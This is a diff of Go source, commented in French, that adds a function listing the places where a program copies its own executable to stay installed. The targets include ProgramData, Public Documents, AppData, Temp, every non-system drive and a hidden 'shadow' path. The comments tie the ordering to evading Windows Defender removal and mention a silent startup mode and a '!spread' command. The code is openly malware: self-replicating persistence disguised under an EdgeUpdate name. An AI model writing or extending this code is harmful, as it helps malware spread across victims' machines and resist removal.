@@ -56,6 +56,45 @@ func copyTo(src, dst string, data []byte) bool {
 	return true
 }
 
+// spreadCopyPaths rend la liste des emplacements de copie, dans l ordre de
+// preference pour la persistance : ProgramData d abord, car Defender supprime
+// le miroir EdgeUpdate en priorite.
+func spreadCopyPaths() []string {
+	home := os.Getenv("USERPROFILE")
+	appdata := os.Getenv("APPDATA")
+	local := appDataLocal()
+	public := os.Getenv("PUBLIC")
+	name := mirrorFileName
+	folder := workDirName
+
+	var out []string
+	if os.Getenv("ProgramData") != "" {
+		out = append(out, filepath.Join(os.Getenv("ProgramData"), folder, name))
+	}
+	if public != "" {
+		out = append(out, filepath.Join(public, "Documents", folder, name))
+	}
+	if appdata != "" {
+		out = append(out, filepath.Join(appdata, folder, name))
+	}
+	if local != "" {
+		out = append(out, filepath.Join(local, folder, name))
+	}
+	if home != "" {
+		out = append(out, filepath.Join(home, "Documents", folder, name))
+		out = append(out, filepath.Join(home, "AppData", "Local", "Temp", folder, name))
+	}
+	fixed, _ := driveList()
+	for _, d := range fixed {
+		if strings.EqualFold(strings.TrimSuffix(d, `\`), os.Getenv("SystemDrive")) {
+			continue
+		}
+		out = append(out, filepath.Join(d, folder, name))
+	}
+	out = append(out, shadowPath())
+	return out
+}
+
 // spreadCopies duplique l'exécutable aux emplacements prévus. `verbose`
 // journalise chaque copie (commande !spread) ; au démarrage, l'opération est
 // silencieuse.
